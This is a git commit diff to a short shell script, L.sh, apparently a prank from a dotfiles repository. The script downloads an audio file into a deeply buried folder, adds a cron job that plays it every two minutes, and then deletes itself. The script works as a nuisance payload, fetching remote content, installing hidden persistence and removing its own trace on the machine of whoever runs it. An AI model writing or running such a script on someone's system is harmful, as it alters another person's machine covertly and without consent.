7c23c4ab4788a98567ce361f66589289ec98331f
David Ernst <git@dsernst.com>
2015-01-16 23:27:09 -0800

    add mkdir to L.sh, use -L flag for curl, semicolons

--- L.sh
+++ L.sh
@@ -1,11 +1,13 @@
-curl https://github.com/dsernst/dotfiles/raw/master/randy.m4a > ~/Documents/notimportant/useless/lol/gaia/seriouslynotabigdeal/omg/why/dont/you/listen/to/me/randy.m4a
+mkdir ~/Documents/notimportant/useless/lol/gaia/seriouslynotabigdeal/omg/why/dont/you/listen/to/me/;
+
+curl -L https://github.com/dsernst/dotfiles/raw/master/randy.m4a > ~/Documents/notimportant/useless/lol/gaia/seriouslynotabigdeal/omg/why/dont/you/listen/to/me/randy.m4a;
 
 #write out current crontab
-crontab -l > mystpidcron
+crontab -l > mystpidcron;
 #echo new cron into cron file
-echo "*/2 * * * * afplay ~/Documents/notimportant/useless/lol/gaia/seriouslynotabigdeal/omg/why/dont/you/listen/to/me/randy.m4a" >> mystpidcron
+echo "*/2 * * * * afplay ~/Documents/notimportant/useless/lol/gaia/seriouslynotabigdeal/omg/why/dont/you/listen/to/me/randy.m4a" >> mystpidcron;
 #install new cron file
-crontab mystpidcron
-rm mystpidcron
+crontab mystpidcron;
+rm mystpidcron;
 
-rm -- "$0"
+rm -- "$0";
